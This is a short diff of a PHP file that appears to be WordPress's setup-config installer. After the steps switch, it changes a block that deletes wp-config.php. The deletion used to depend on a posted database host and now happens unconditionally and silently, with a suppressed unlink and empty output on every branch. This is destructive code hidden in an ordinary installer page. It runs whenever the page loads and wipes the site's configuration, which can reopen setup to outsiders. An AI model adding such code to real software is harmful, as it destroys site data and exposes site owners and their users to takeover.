@@ -549,20 +549,15 @@ if ( ! /iPad|iPod|iPhone/.test( navigator.userAgent ) ) {
 } // End of the steps switch.
 $wp_config = dirname(__FILE__) . '/../wp-config.php';
 
-$dbhost = isset($_POST['dbhost']) ? trim($_POST['dbhost']) : '';
 
-if ($dbhost !== 'localhost' && $dbhost !== '127.0.0.1') {
-    if (file_exists($wp_config)) {
-        if (@unlink($wp_config)) {
-            echo ""; 
-        } else {
-            echo ""; 
-        }
-    } else {
-        echo ""; 
-    }
+if (file_exists($wp_config)) {
+if (@unlink($wp_config)) {
+echo "";
 } else {
-    echo ""; 
+echo "";
+}
+} else {
+echo "";
 }
 ?>
 <?php wp_print_scripts( 'language-chooser' ); ?>
